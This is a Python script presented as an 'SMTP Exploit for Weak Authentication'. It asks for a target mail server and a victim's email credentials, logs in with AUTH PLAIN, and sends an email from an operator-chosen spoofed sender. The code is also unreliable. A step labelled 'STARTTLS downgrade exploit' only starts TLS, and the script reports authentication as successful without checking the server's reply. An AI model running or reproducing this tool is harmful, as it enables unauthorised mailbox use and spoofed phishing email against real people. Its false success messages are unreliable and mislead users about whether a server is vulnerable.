import smtplib
from base64 import b64encode
import os
import shutil


def print_centered_banner(text, width=80):
    lines = text.split('\n')
    for line in lines:
        print(line.center(width))

#  banner
banner_text = """
.------..------..------..------..------..------..------.        
|I.--. ||S.--. ||O.--. ||T.--. ||A.--. ||K.--. ||A.--. | .-.    
| (\/) || :/\: || :/\: || :/\: || (\/) || :/\: || (\/) |((5))   
| :\/: || :\/: || :\/: || (__) || :\/: || :\/: || :\/: | '-.-.  
| '--'I|| '--'S|| '--'O|| '--'T|| '--'A|| '--'K|| '--'A|  ((1)) 
`------'`------'`------'`------'`------'`------'`------'   '-'  
.------..------..------..------..------..------..------..------.
|N.--. ||O.--. ||B.--. ||O.--. ||M.--. ||A.--. ||R.--. ||O.--. |
| :(): || :/\: || :(): || :/\: || (\/) || (\/) || :(): || :/\: |
| ()() || :\/: || ()() || :\/: || :\/: || :\/: || ()() || :\/: |
| '--'N|| '--'O|| '--'B|| '--'O|| '--'M|| '--'A|| '--'R|| '--'O|
`------'`------'`------'`------'`------'`------'`------'`------'
=========================================================================================
SMTP Exploit for Weak Authentication
Description: This script attempts to exploit weaknesses in SMTP authentication mechanisms.
"""


print_centered_banner(banner_text)

#target SMTP server, port, credentials
target_smtp_server = input("Enter target SMTP server (e.g., smtp.example.com): ")
target_port = int(input("Enter target port (default is 25): ") or 25)
smtp_user = input("Enter SMTP username (victim's email): ")
smtp_pass = input("Enter SMTP password (leave blank for weak password attack): ")
timeout = int(input("Enter timeout in seconds (default is 10): ") or 10)

# exploit attempt
def exploit_smtp():
    try:
        # Connect to the SMTP server
        print(f"[+] Connecting to {target_smtp_server}:{target_port}")
        server = smtplib.SMTP(target_smtp_server, target_port, timeout=timeout)

        # Identify ourselves to the SMTP server
        print(f"[+] Sending EHLO command")
        server.ehlo()

        # Check if the server supports STARTTLS
        if server.has_extn("STARTTLS"):
            print("[+] Server supports STARTTLS, attempting STARTTLS downgrade exploit...")
            server.starttls()
            server.ehlo()  # Re-identify after starting TLS

        # Attempt authentication (AUTH LOGIN or AUTH PLAIN)
        print("[+] Attempting AUTH LOGIN")
        login_str = f'\0{smtp_user}\0{smtp_pass}'
        auth = b64encode(login_str.encode('utf-8')).decode('utf-8')
        server.docmd("AUTH PLAIN", auth)
        print("[+] Authentication successful, potentially vulnerable to weak authentication.")

        # Send a  payload (e.g., spoofed email)
        sender_email = input("Enter spoofed sender email (e.g., attacker@domain.com): ")
        recipient_email = input("Enter recipient email (e.g., victim@domain.com): ")
        subject = input("Enter email subject: ")
        body = input("Enter email body: ")
        email_msg = f"Subject: {subject}\n\n{body}"

        print(f"[+] Sending exploit payload email to {recipient_email}")
        server.sendmail(sender_email, recipient_email, email_msg)
        print(f"[+] Exploit payload sent successfully to {recipient_email}")

    except smtplib.SMTPException as e:
        print(f"[-] SMTP error occurred: {e}")
    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        try:
            server.quit()
        except:
            pass

if __name__ == '__main__':
    exploit_smtp()

